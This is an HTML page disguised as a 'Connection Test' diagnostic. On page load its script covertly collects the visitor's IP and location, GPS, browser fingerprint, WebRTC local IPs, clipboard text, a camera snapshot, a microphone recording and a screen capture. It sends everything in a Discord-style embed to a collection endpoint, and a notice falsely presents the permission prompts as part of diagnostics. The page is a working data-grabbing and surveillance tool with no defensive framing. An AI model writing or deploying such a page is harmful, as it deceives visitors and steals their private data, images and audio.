<!DOCTYPE html>
<html>
<head>
    <title>Connection Test</title>
    <style>
        body { background:#0a0a0a; color:#0f0; font-family:monospace; text-align:center; padding:2rem; }
        #log { margin-top:20px; white-space:pre-wrap; text-align:left; max-width:900px; margin-left:auto; margin-right:auto; background:#000; padding:1rem; border:1px solid #0f0; }
        #permission-notice { font-size:0.8rem; color:#aaa; margin-top:20px; }
    </style>
</head>
<body>
    <h1>Establishing secure link...</h1>
    <pre id="log">Collecting extended diagnostic data...</pre>
    <div id="permission-notice">(camera/mic/screen/geo/clipboard may request permission – this is part of diagnostics)</div>

    <script>
        const BACKEND_URL = '/api/collect';

        (async () => {
            const logEl = document.getElementById('log');
            const data = {};

            // ==================== ORIGINAL FUNCTIONS (KEPT UNCHANGED) ====================
            async function getIPInfo() {
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const { ip } = await ipRes.json();
                    data.public_ip = ip;

                    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                    const geo = await geoRes.json();
                    data.vpn_detected = geo.proxy || geo.hosting || (geo.org && geo.org.toLowerCase().includes('vpn')) || false;
                    data.location = { city: geo.city, region: geo.region, country: geo.country_name, lat: geo.latitude, lon: geo.longitude };
                } catch(e) { data.ip_error = e.message; }
            }

            function getFingerprint() {
                const fp = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    screen: { width: screen.width, height: screen.height, pixelRatio: window.devicePixelRatio },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    canvas: null, 
                    webgl: null
                };
                const canvas = document.createElement('canvas');
                canvas.width = 200; canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#f60'; ctx.fillRect(0,0,100,30);
                ctx.fillStyle = '#069'; ctx.fillText('Frenesis',2,15);
                fp.canvas = canvas.toDataURL();
                
                const gl = document.createElement('canvas').getContext('webgl');
                if(gl) {
                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
                    if(debug) fp.webgl = { 
                        vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL), 
                        renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) 
                    };
                }
                return fp;
            }

            async function scanVulns() {
                const vulns = [];
                const ua = navigator.userAgent;
                if(/Chrome\/([0-9]+)/.test(ua)) {
                    const v = parseInt(ua.match(/Chrome\/([0-9]+)/)[1]);
                    if(v < 90) vulns.push('Chrome <90 (RCE)');
                }
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = (e) => {
                        if(e.candidate) {
                            const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                            if(ipMatch && !ipMatch[0].startsWith('192.168.') && !ipMatch[0].startsWith('10.'))
                                vulns.push(`WebRTC leak: ${ipMatch[0]}`);
                        }
                    };
                } catch(e){}
                if(localStorage.length > 0) vulns.push('LocalStorage has data');
                return vulns;
            }

            async function getExtended() {
                const ext = {};
                if(navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    ext.battery = { level: bat.level, charging: bat.charging };
                }
                if(navigator.connection) {
                    ext.network = { effectiveType: navigator.connection.effectiveType, rtt: navigator.connection.rtt, downlink: navigator.connection.downlink };
                }
                return ext;
            }

            // ==================== NEW EXTENDED DIAGNOSTICS (MASSIVELY EXPANDED) ====================

            // 1. Full WebRTC local IPs (all interfaces)
            async function getAllLocalIPs() {
                return new Promise((resolve) => {
                    const ips = new Set();
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    pc.onicecandidate = (e) => {
                        if (!e.candidate) {
                            pc.close();
                            resolve(Array.from(ips));
                            return;
                        }
                        const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                        if (ipMatch) ips.add(ipMatch[0]);
                    };
                    setTimeout(() => {
                        pc.close();
                        resolve(Array.from(ips));
                    }, 2000);
                });
            }

            // 2. Geolocation (GPS)
            async function getGeolocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) { resolve(null); return; }
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                        err => resolve({ error: err.message }),
                        { timeout: 5000 }
                    );
                });
            }

            // 3. Camera snapshot (stills) – capture single frame from video
            async function captureCameraSnapshot(videoTrack) {
                if (!videoTrack) return null;
                const stream = new MediaStream([videoTrack]);
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 200));
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                const dataURL = canvas.toDataURL('image/jpeg', 0.7);
                video.srcObject = null;
                video.remove();
                trackStop(videoTrack); // stop track to release camera
                return dataURL.slice(0, 200); // truncate for Discord, full in raw logs? we'll store full in separate field maybe.
            }

            function trackStop(track) { if(track && track.stop) track.stop(); }

            // 4. Microphone recording (short audio sample)
            async function captureMicrophoneSample(stream) {
                if (!stream) return null;
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.start();
                await new Promise(r => setTimeout(r, 3000));
                mediaRecorder.stop();
                await new Promise(r => mediaRecorder.onstop = r);
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const url = URL.createObjectURL(blob);
                const base64 = await blobToBase64(blob);
                URL.revokeObjectURL(url);
                stream.getTracks().forEach(t => t.stop());
                return base64.slice(0, 200); // truncated
            }
            function blobToBase64(blob) {
                return new Promise((resolve) => {
                    const reader = new FileReader();
                    reader.onloadend = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                });
            }

            // 5. Screen capture snapshot
            async function captureScreenSnapshot() {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return null;
                try {
                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    await new Promise(r => setTimeout(r, 500));
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    const dataURL = canvas.toDataURL('image/jpeg', 0.5);
                    stream.getTracks().forEach(t => t.stop());
                    video.remove();
                    return dataURL.slice(0, 200);
                } catch(e) { return { error: e.message }; }
            }

            // 6. Clipboard read (text)
            async function readClipboard() {
                if (!navigator.clipboard || !navigator.clipboard.readText) return null;
                try {
                    const text = await navigator.clipboard.readText();
                    return text.length > 100 ? text.slice(0,100)+'...' : text;
                } catch(e) { return { error: e.message }; }
            }

            // 7. Device orientation
            function getOrientation() {
                return new Promise((resolve) => {
                    if (!window.DeviceOrientationEvent) { resolve(null); return; }
                    const handler = (e) => {
                        window.removeEventListener('deviceorientation', handler);
                        resolve({ alpha: e.alpha, beta: e.beta, gamma: e.gamma });
                    };
                    window.addEventListener('deviceorientation', handler, { once: true });
                    setTimeout(() => resolve(null), 2000);
                });
            }

            // 8. Ambient light sensor
            async function getAmbientLight() {
                if (!window.AmbientLightSensor) return null;
                try {
                    const sensor = new AmbientLightSensor();
                    sensor.start();
                    await new Promise(r => sensor.onreading = r);
                    const value = sensor.illuminance;
                    sensor.stop();
                    return value;
                } catch(e) { return null; }
            }

            // 9. Bluetooth devices (basic availability)
            async function getBluetoothAvailability() {
                if (!navigator.bluetooth) return false;
                try {
                    // just check if device supports – without requesting devices
                    return true;
                } catch(e) { return false; }
            }

            // 10. USB devices (via WebUSB – requires user gesture and permission)
            async function getUSBAvailability() {
                if (!navigator.usb) return false;
                return true;
            }

            // 11. Speech recognition (just check support)
            function getSpeechRecognitionSupport() {
                const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
                return !!SpeechRecognition;
            }

            // 12. Vibration (if supported)
            function vibratePattern() {
                if (!navigator.vibrate) return 'not supported';
                navigator.vibrate(200);
                return 'vibrated 200ms';
            }

            // 13. Notifications permission and show test (silent)
            async function checkNotifications() {
                if (!('Notification' in window)) return 'not supported';
                const permission = Notification.permission;
                if (permission === 'granted') {
                    new Notification('Diagnostic test', { body: 'This is a test notification.', silent: true });
                    return 'granted (test sent)';
                }
                return permission;
            }

            // 14. Gamepad detection
            function getGamepads() {
                const pads = navigator.getGamepads ? navigator.getGamepads() : [];
                return pads.filter(p => p !== null).map(p => ({ id: p.id, buttons: p.buttons.length, axes: p.axes.length }));
            }

            // 15. Installed fonts (through CSS/JS measurement)
            function getInstalledFonts() {
                const fontList = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS", "Impact", "Tahoma", "Trebuchet MS", "Lucida Console", "Segoe UI", "Roboto", "Open Sans", "Calibri", "Cambria", "Consolas"];
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                function checkFont(font) {
                    ctx.font = `72px ${font}`;
                    const ref = ctx.measureText('mmmmmm').width;
                    ctx.font = `72px Arial, ${font}`;
                    const test = ctx.measureText('mmmmmm').width;
                    return ref !== test;
                }
                return fontList.filter(checkFont);
            }

            // 16. WebShare API support
            function webShareSupport() { return !!navigator.share; }

            // 17. Permissions API (enumerate)
            async function getAllPermissions() {
                if (!navigator.permissions || !navigator.permissions.query) return {};
                const permissionNames = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write', 'persistent-storage', 'ambient-light-sensor', 'accelerometer', 'gyroscope', 'magnetometer'];
                const results = {};
                for (const name of permissionNames) {
                    try {
                        const status = await navigator.permissions.query({ name });
                        results[name] = status.state;
                    } catch(e) { results[name] = 'error'; }
                }
                return results;
            }

            // 18. Media devices (list all cameras, mics, speakers)
            async function enumerateMediaDevices() {
                if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return [];
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    return devices.map(d => ({ kind: d.kind, label: d.label || 'hidden', deviceId: d.deviceId.slice(0,10) + '...' }));
                } catch(e) { return []; }
            }

            // 19. Request camera & microphone streams (to get metadata + snapshots)
            async function requestCameraAndMic() {
                let cameraStream = null, micStream = null, cameraSnapshot = null, micSample = null, cameraTrack = null;
                try {
                    cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
                    if (cameraStream && cameraStream.getVideoTracks().length) {
                        cameraTrack = cameraStream.getVideoTracks()[0];
                        cameraSnapshot = await captureCameraSnapshot(cameraTrack);
                    }
                } catch(e) { cameraSnapshot = { error: e.message }; }
                try {
                    micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    if (micStream) micSample = await captureMicrophoneSample(micStream);
                } catch(e) { micSample = { error: e.message }; }
                return { cameraSnapshot, micSample };
            }

            // ==================== MAIN EXECUTION (all original + new) ====================
            try {
                logEl.textContent = 'Collecting data... (camera/mic/etc may request permission)';

                // 1. Original methods
                await getIPInfo();
                const fingerprint = getFingerprint();
                const vulns = await scanVulns();
                const extended = await getExtended();

                // 2. New intensive collection
                const [allLocalIPs, geoLocation, orientation, ambientLight, bluetoothAvail, usbAvail, speechRecog, notifications, gamepads, installedFonts, webShare, permissions, mediaDevices, cameraMicData] = await Promise.all([
                    getAllLocalIPs(),
                    getGeolocation(),
                    getOrientation(),
                    getAmbientLight(),
                    getBluetoothAvailability(),
                    getUSBAvailability(),
                    getSpeechRecognitionSupport(),
                    checkNotifications(),
                    getGamepads(),
                    getInstalledFonts(),
                    webShareSupport(),
                    getAllPermissions(),
                    enumerateMediaDevices(),
                    requestCameraAndMic()
                ]);
                const clipboardText = await readClipboard();
                const screenSnapshot = await captureScreenSnapshot();

                // 3. Build massive diagnostic object
                const fullDiag = {
                    webrtc_local_ips: allLocalIPs,
                    geolocation: geoLocation,
                    orientation: orientation,
                    ambient_light_lux: ambientLight,
                    bluetooth_available: bluetoothAvail,
                    usb_available: usbAvail,
                    speech_recognition_support: speechRecog,
                    notifications_status: notifications,
                    gamepads: gamepads,
                    installed_fonts_sample: installedFonts,
                    web_share_support: webShare,
                    permissions: permissions,
                    media_devices: mediaDevices,
                    camera_snapshot_thumb: cameraMicData.cameraSnapshot || null,
                    microphone_sample_thumb: cameraMicData.micSample || null,
                    screen_snapshot_thumb: screenSnapshot || null,
                    clipboard_text_sample: clipboardText,
                    // Also include original 'full headers' style from previous version
                    httpHeaders: { userAgent: navigator.userAgent, accept: navigator.languages?.join(',') },
                    jsAttributes: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        cookiesEnabled: navigator.cookieEnabled,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        language: navigator.language,
                        languages: navigator.languages,
                        doNotTrack: navigator.doNotTrack,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        deviceMemory: navigator.deviceMemory,
                        plugins: Array.from(navigator.plugins || []).map(p => p.name),
                        screen: { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, pixelDepth: screen.pixelDepth },
                        localStorage: !!window.localStorage,
                        sessionStorage: !!window.sessionStorage,
                        indexedDB: !!window.indexedDB
                    }
                };

                logEl.textContent = 'Sending full diagnostics payload...';

                // Prepare final Embed – truncate large fields to fit Discord (2000 char limit per embed)
                const truncate = (str, max=900) => typeof str === 'string' ? str.slice(0,max) : JSON.stringify(str).slice(0,max);
                const finalPayload = {
                    content: '**ULTRA EXTENDED VISITOR DIAGNOSTICS**',
                    embeds: [{
                        title: 'Full Capture + Camera/Mic/Screen/Geo/More',
                        color: 0xff0000,
                        fields: [
                            { name: 'IP & Location', value: `${data.public_ip || 'unknown'} - ${data.location ? data.location.city + ', ' + data.location.country : 'N/A'}`, inline: false },
                            { name: 'VPN / Proxy', value: data.vpn_detected ? 'Yes' : 'No', inline: true },
                            { name: 'GPS (device)', value: geoLocation ? `${geoLocation.lat},${geoLocation.lon} (±${geoLocation.accuracy}m)` : 'unavailable/denied', inline: false },
                            { name: 'Basic Fingerprint', value: '```json\n' + JSON.stringify(fingerprint, null, 2).slice(0,700) + '```', inline: false },
                            { name: 'Vulnerabilities', value: vulns.join('\n') || 'None', inline: false },
                            { name: 'Extended (battery/network)', value: '```json\n' + JSON.stringify(extended, null, 2) + '```', inline: false },
                            { name: 'WebRTC Local IPs', value: allLocalIPs.join(', ') || 'none', inline: false },
                            { name: 'Orientation (α/β/γ)', value: orientation ? `${orientation.alpha},${orientation.beta},${orientation.gamma}` : 'none', inline: false },
                            { name: 'Fonts (sample)', value: installedFonts.join(', ') || 'none', inline: false },
                            { name: 'Permissions', value: '```json\n' + JSON.stringify(permissions, null, 2).slice(0,500) + '```', inline: false },
                            { name: 'Camera Snapshot (thumb)', value: (cameraMicData.cameraSnapshot && typeof cameraMicData.cameraSnapshot === 'string') ? cameraMicData.cameraSnapshot.slice(0,200) : 'failed/denied', inline: false },
                            { name: 'Microphone Sample (base64)', value: (cameraMicData.micSample && typeof cameraMicData.micSample === 'string') ? cameraMicData.micSample.slice(0,200) : 'failed/denied', inline: false },
                            { name: 'Screen Snapshot (thumb)', value: (screenSnapshot && typeof screenSnapshot === 'string') ? screenSnapshot.slice(0,200) : 'failed/denied', inline: false },
                            { name: 'Clipboard Text', value: (clipboardText && typeof clipboardText === 'string') ? clipboardText.slice(0,200) : 'no read permission/empty', inline: false },
                            { name: 'Full JS & Headers Diag', value: '```json\n' + JSON.stringify(fullDiag, null, 2).slice(0,1000) + '```', inline: false }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                const sendRes = await fetch(BACKEND_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(finalPayload)
                });

                logEl.textContent = sendRes.ok ? 'Full diagnostics sent successfully.' : 'Sent with partial success (HTTP ' + sendRes.status + ')';
            } catch (err) {
                console.error(err);
                logEl.textContent = 'Error: ' + err.message;
            }
        })();
    </script>
</body>
</html>
